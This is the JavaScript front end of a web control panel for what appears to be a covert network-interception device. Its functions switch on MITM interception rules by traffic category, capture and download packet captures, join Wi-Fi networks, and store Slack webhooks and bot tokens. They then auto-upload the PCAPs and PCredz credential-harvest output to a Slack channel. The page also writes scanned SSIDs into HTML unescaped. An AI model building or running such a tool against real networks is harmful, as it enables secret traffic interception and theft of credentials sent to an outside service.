async function disableMITM(){if(!confirm("Disable MITM and cleanup all rules?"))return;showAlert("Disabling MITM...","info");try{const res=await fetch("/api/mitm/disable",{method:"POST"});const data=await res.json();if(data.success){showAlert("MITM disabled","success");setTimeout(fetchStatus,1000)}}catch(err){showAlert("Error: "+err.message,"error")}}
async function interceptCategory(category){const destination=document.getElementById("remoteIP").value.trim()?'remote':'local';const target=destination==='remote'?document.getElementById("remoteIP").value:'bridge IP';if(!confirm("Intercept "+category+" traffic?\n\nDestination: "+target))return;showAlert("Adding "+category+" intercept rules...","info");try{const res=await fetch("/api/mitm/intercept",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({category:category,destination:destination})});const data=await res.json();if(data.success){showAlert(category+" interception enabled ("+data.rules_added+" rules)","success");setTimeout(fetchStatus,1000)}else{showAlert("Failed to add rules","error")}}catch(err){showAlert("Error: "+err.message,"error")}}
async function clearRules(){if(!confirm("Remove all intercept rules?"))return;try{const res=await fetch("/api/mitm/clear_rules",{method:"POST"});if(res.ok){showAlert("Rules cleared","success");setTimeout(fetchStatus,1000)}}catch(err){showAlert("Error: "+err.message,"error")}}


// Wait for DOM to be fully loaded before attaching event listeners
console.log('Setting up DOMContentLoaded handler');
document.addEventListener('DOMContentLoaded',function(){
try{
console.log('DOM Content Loaded - attaching event listeners');
const btnStart=document.getElementById("btnStart");
const btnStop=document.getElementById("btnStop");
const btnDownload=document.getElementById("btnDownload");
const btnDelete=document.getElementById("btnDelete");

console.log('Buttons found:', {start:!!btnStart, stop:!!btnStop, download:!!btnDownload, delete:!!btnDelete});

if(btnStart){
btnStart.addEventListener("click",startCapture);
console.log('Start button listener attached');
}
if(btnStop){
btnStop.addEventListener("click",stopCapture);
console.log('Stop button listener attached');
}
if(btnDownload){
btnDownload.addEventListener("click",downloadPCAP);
console.log('Download button listener attached');
}
if(btnDelete){
btnDelete.addEventListener("click",deletePCAP);
console.log('Delete button listener attached');
}

console.log('Fetching initial status...');
fetchStatus();
setInterval(fetchStatus,3000);
loadWifiInterfaces();
loadConfig();
console.log('Setup complete!');
}catch(err){
console.error('DOMContentLoaded error:',err);
alert('Initialization error: '+err.message);
}
});

async function loadWifiInterfaces(){
try{
const res=await fetch("/api/wifi/interfaces");
const data=await res.json();
const select=document.getElementById("wifiInterface");
if(select){
select.innerHTML='<option value="">Select interface...</option>';
if(data.interfaces){
data.interfaces.forEach(function(iface){
const opt=document.createElement("option");
opt.value=iface;
opt.textContent=iface;
select.appendChild(opt);
});
}
}
}catch(err){console.error("Failed to load interfaces:",err)}
}

async function scanAPs(){
const iface=document.getElementById("wifiInterface").value;
if(!iface){showAlert("Select interface first","error");return}
showAlert("Scanning for APs...","info");
try{
const res=await fetch("/api/wifi/scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({interface:iface})});
const data=await res.json();
if(data.success){
const apList=document.getElementById("apList");
if(apList){
if(data.aps.length===0){
apList.innerHTML="<p style='color:#999;padding:20px;text-align:center'>No APs found</p>";
}else{
let html="<div style='display:flex;flex-direction:column;gap:5px'>";
data.aps.forEach(function(ap){
html+="<div onclick=\"selectAP('"+ap.ssid+"')\" style='padding:10px;background:#fff;border:1px solid #e0e0e0;border-radius:5px;cursor:pointer;transition:all .3s' onmouseover=\"this.style.borderColor='#667eea'\" onmouseout=\"this.style.borderColor='#e0e0e0'\">";
html+="<strong>"+ap.ssid+"</strong> - Signal: "+(ap.signal||-100)+" dBm - "+ap.security;
html+="</div>";
});
html+="</div>";
apList.innerHTML=html;
}
}
showAlert("Found "+data.aps.length+" APs","success");
}else{
showAlert("Scan failed: "+(data.error||"Unknown"),"error");
}
}catch(err){showAlert("Error: "+err.message,"error")}
}

function selectAP(ssid){
document.getElementById("wifiSSID").value=ssid;
}

function updateCurrentConnection(wifiData){
const currentConn=document.getElementById("currentConnection");
const currentConnInfo=document.getElementById("currentConnectionInfo");
const internetTestSection=document.getElementById("internetTestSection");
if(currentConn&&currentConnInfo){
if(wifiData&&wifiData.connected){
currentConn.style.display="block";
currentConn.style.borderLeftColor="#28a745";
currentConnInfo.innerHTML="Interface: <strong>"+(wifiData.interface||"N/A")+"</strong> | SSID: <strong>"+(wifiData.ssid||"N/A")+"</strong> | IP: "+(wifiData.ip_address||"N/A");
if(internetTestSection){
internetTestSection.style.display="block";
}
}else{
currentConn.style.display="none";
currentConnInfo.innerHTML="Not connected";
if(internetTestSection){
internetTestSection.style.display="none";
}
}
}
}

async function connectWiFi(){
const iface=document.getElementById("wifiInterface").value;
const ssid=document.getElementById("wifiSSID").value;
const password=document.getElementById("wifiPassword").value;
if(!iface||!ssid){showAlert("Interface and SSID required","error");return}
showAlert("Connecting...","info");
try{
const res=await fetch("/api/wifi/connect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({interface:iface,ssid:ssid,password:password})});
const data=await res.json();
if(data.success){
showAlert("Connected! Testing internet...","success");
updateWifiStatus(data);
testInternet();
}else{
showAlert("Connection failed: "+(data.error||"Unknown"),"error");
}
}catch(err){showAlert("Error: "+err.message,"error")}
}

async function disconnectWiFi(){
try{
const res=await fetch("/api/wifi/disconnect",{method:"POST"});
const data=await res.json();
if(data.success){
showAlert("Disconnected","success");
updateWifiStatus({connected:false});
updateCurrentConnection({connected:false});
}else{
showAlert("Disconnect failed","error");
}
}catch(err){showAlert("Error: "+err.message,"error")}
}

async function testInternet(){
const btnTest=document.getElementById("btnTestInternet");
const btnTestDetailed=document.getElementById("btnTestInternetDetailed");
const testBtn=btnTestDetailed||btnTest;
if(testBtn)testBtn.disabled=true;
showAlert("Testing internet connectivity...","info");
try{
const res=await fetch("/api/wifi/test",{method:"POST"});
const data=await res.json();
const status=document.getElementById("wifiStatus");
const testResults=document.getElementById("internetTestResults");
if(status){
let html="<strong>Internet Test:</strong><br>";
html+="Ping: "+(data.ping?"<span style='color:#28a745'>OK</span>":"<span style='color:#dc3545'>FAIL</span>")+"<br>";
html+="DNS: "+(data.dns?"<span style='color:#28a745'>OK</span>":"<span style='color:#dc3545'>FAIL</span>")+"<br>";
html+="Status: "+(data.connected?"<span style='color:#28a745'>Connected</span>":"<span style='color:#dc3545'>No Internet</span>");
status.innerHTML=html;
}
if(testResults){
let html="<div style='display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin-bottom:15px'>";
html+="<div style='padding:10px;background:#f8f9fa;border-radius:5px'><strong style='display:block;margin-bottom:5px;color:#666'>Ping Test</strong>";
html+="<div style='font-size:1.5em;font-weight:700;color:"+(data.ping?"#28a745":"#dc3545")+"'>"+(data.ping?"PASS":"FAIL")+"</div>";
if(data.ping_time){
html+="<div style='font-size:.85em;color:#666;margin-top:5px'>Avg: "+data.ping_time.toFixed(2)+" ms</div>";
}
html+="</div>";
html+="<div style='padding:10px;background:#f8f9fa;border-radius:5px'><strong style='display:block;margin-bottom:5px;color:#666'>DNS Test</strong>";
html+="<div style='font-size:1.5em;font-weight:700;color:"+(data.dns?"#28a745":"#dc3545")+"'>"+(data.dns?"PASS":"FAIL")+"</div>";
if(data.dns_server){
html+="<div style='font-size:.85em;color:#666;margin-top:5px'>Server: "+data.dns_server+"</div>";
}
html+="</div>";
html+="<div style='padding:10px;background:#f8f9fa;border-radius:5px'><strong style='display:block;margin-bottom:5px;color:#666'>HTTP Test</strong>";
html+="<div style='font-size:1.5em;font-weight:700;color:"+(data.http?"#28a745":"#dc3545")+"'>"+(data.http?"PASS":"FAIL")+"</div>";
if(data.http_status){
html+="<div style='font-size:.85em;color:#666;margin-top:5px'>Status: "+data.http_status+"</div>";
}
html+="</div>";
html+="</div>";
html+="<div style='padding:15px;background:"+(data.connected?"#d4edda":"#f8d7da")+";border-radius:5px;border-left:4px solid "+(data.connected?"#28a745":"#dc3545")+"'>";
html+="<strong style='color:"+(data.connected?"#155724":"#721c24")+";display:block;margin-bottom:5px'>Overall Status</strong>";
html+="<div style='font-size:1.2em;color:"+(data.connected?"#155724":"#721c24")+"'>"+(data.connected?"INTERNET CONNECTED":"NO INTERNET CONNECTION")+"</div>";
if(data.interface){
html+="<div style='margin-top:8px;font-size:.9em;color:"+(data.connected?"#155724":"#721c24")+"'>Interface: <strong>"+data.interface+"</strong></div>";
}
if(data.gateway){
html+="<div style='font-size:.9em;color:"+(data.connected?"#155724":"#721c24")+"'>Gateway: <strong>"+data.gateway+"</strong></div>";
}
html+="</div>";
testResults.innerHTML=html;
}
if(data.connected){
showAlert("Internet connectivity OK","success");
}else{
showAlert("Internet connectivity failed","error");
}
}catch(err){
showAlert("Test failed: "+err.message,"error");
const testResults=document.getElementById("internetTestResults");
if(testResults){
testResults.innerHTML="<div style='padding:20px;text-align:center;color:#dc3545'><strong>Test Failed</strong><br>"+err.message+"</div>";
}
}finally{
if(testBtn)testBtn.disabled=false;
}
}

function updateWifiStatus(data){
const status=document.getElementById("wifiStatus");
const currentConn=document.getElementById("currentConnection");
const currentConnInfo=document.getElementById("currentConnectionInfo");
if(status){
let html="<strong>WiFi Status:</strong><br>";
if(data.connected){
html+="Connected to: "+data.ssid+"<br>";
html+="IP: "+(data.ip_address||"N/A")+"<br>";
html+="Gateway: "+(data.gateway||"N/A");
if(currentConn){
currentConn.style.display="block";
currentConn.style.borderLeftColor="#28a745";
}
if(currentConnInfo){
currentConnInfo.innerHTML="Interface: <strong>"+(data.interface||"N/A")+"</strong> | SSID: <strong>"+(data.ssid||"N/A")+"</strong> | IP: "+(data.ip_address||"N/A");
}
}else{
html+="Not connected";
if(currentConn){
currentConn.style.display="none";
}
if(currentConnInfo){
currentConnInfo.innerHTML="Not connected";
}
}
status.innerHTML=html;
}
const btnTest=document.getElementById("btnTestInternet");
if(btnTest)btnTest.disabled=false;
}

async function testWebhook(){
const url=document.getElementById("slackWebhook").value;
if(!url){showAlert("Enter webhook URL","error");return}
showAlert("Testing webhook...","info");
try{
const res=await fetch("/api/slack/test/webhook",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({webhook_url:url})});
const data=await res.json();
if(data.success){
showAlert("Webhook test successful!","success");
}else{
showAlert("Webhook test failed: "+(data.error||"Unknown"),"error");
}
}catch(err){showAlert("Error: "+err.message,"error")}
}

async function testToken(){
const token=document.getElementById("slackToken").value;
if(!token){showAlert("Enter bot token","error");return}
showAlert("Testing token...","info");
try{
const res=await fetch("/api/slack/test/token",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({bot_token:token})});
const data=await res.json();
if(data.success){
showAlert("Token test successful!","success");
}else{
showAlert("Token test failed: "+(data.error||"Unknown"),"error");
}
}catch(err){showAlert("Error: "+err.message,"error")}
}

async function testIntegration(){
const webhook=document.getElementById("slackWebhook").value;
const token=document.getElementById("slackToken").value;
const channel=document.getElementById("slackChannel").value;
if(!webhook||!token||!channel){showAlert("Fill all Slack fields","error");return}
showAlert("Testing integration...","info");
try{
const res=await fetch("/api/slack/test/integration",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({webhook_url:webhook,bot_token:token,channel:channel})});
const data=await res.json();
if(data.success&&data.webhook&&data.token){
showAlert("Integration test successful!","success");
}else{
showAlert("Integration test failed","error");
}
}catch(err){showAlert("Error: "+err.message,"error")}
}

async function enableUpload(){
const webhook=document.getElementById("slackWebhook").value;
const token=document.getElementById("slackToken").value;
const channel=document.getElementById("slackChannel").value;
if(!webhook||!token||!channel){showAlert("Configure Slack first","error");return}
try{
await fetch("/api/slack/configure",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({webhook_url:webhook,bot_token:token,channel:channel})});
const uploadPcap=document.getElementById("uploadPCAP").checked;
const uploadPcredz=document.getElementById("uploadPCredz").checked;
const res=await fetch("/api/upload/enable",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({enabled:true,upload_pcap:uploadPcap,upload_pcredz:uploadPcredz})});
const data=await res.json();
if(data.success){
showAlert("Auto-upload enabled","success");
saveConfig();
}else{
showAlert("Failed to enable upload","error");
}
}catch(err){showAlert("Error: "+err.message,"error")}
}

async function triggerUpload(){
showAlert("Uploading...","info");
try{
const res=await fetch("/api/upload/trigger",{method:"POST"});
const data=await res.json();
if(data.success){
showAlert("Upload triggered","success");
}else{
showAlert("Upload failed","error");
}
}catch(err){showAlert("Error: "+err.message,"error")}
}

async function saveConfig(){
const wifi={interface:document.getElementById("wifiInterface").value,ssid:document.getElementById("wifiSSID").value,password:document.getElementById("wifiPassword").value,auto_connect:document.getElementById("autoConnect").checked};
const slack={webhook_url:document.getElementById("slackWebhook").value,bot_token:document.getElementById("slackToken").value,channel:document.getElementById("slackChannel").value,auto_upload:document.getElementById("autoUpload").checked,upload_pcap:document.getElementById("uploadPCAP").checked,upload_pcredz:document.getElementById("uploadPCredz").checked};
showAlert("Saving configuration...","info");
try{
const res=await fetch("/api/config/save",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({wifi:wifi,slack:slack})});
const data=await res.json();
if(data.success){
showAlert("Configuration saved! Will persist across reboots.","success");
const status=document.getElementById("configStatus");
if(status)status.innerHTML="<span style='color:#28a745'>Configuration saved</span>";
}else{
showAlert("Save failed: "+(data.error||"Unknown"),"error");
}
}catch(err){showAlert("Error: "+err.message,"error")}
}

async function loadConfig(){
try{
const res=await fetch("/api/config/load");
const data=await res.json();
if(data.wifi){
document.getElementById("wifiInterface").value=data.wifi.interface||"";
document.getElementById("wifiSSID").value=data.wifi.ssid||"";
document.getElementById("autoConnect").checked=data.wifi.auto_connect||false;
}
if(data.slack){
document.getElementById("slackWebhook").value=data.slack.webhook_url||"";
document.getElementById("slackToken").value=data.slack.bot_token||"";
document.getElementById("slackChannel").value=data.slack.channel||"";
document.getElementById("autoUpload").checked=data.slack.auto_upload||false;
document.getElementById("uploadPCAP").checked=data.slack.upload_pcap!==undefined?data.slack.upload_pcap:true;
document.getElementById("uploadPCredz").checked=data.slack.upload_pcredz!==undefined?data.slack.upload_pcredz:true;
}
showAlert("Configuration loaded","success");
const status=document.getElementById("configStatus");
if(status)status.innerHTML="<span style='color:#28a745'>Configuration loaded</span>";
}catch(err){showAlert("Error: "+err.message,"error")}
}

console.log('Script loaded, waiting for DOM...');
</script>
</body>
</html>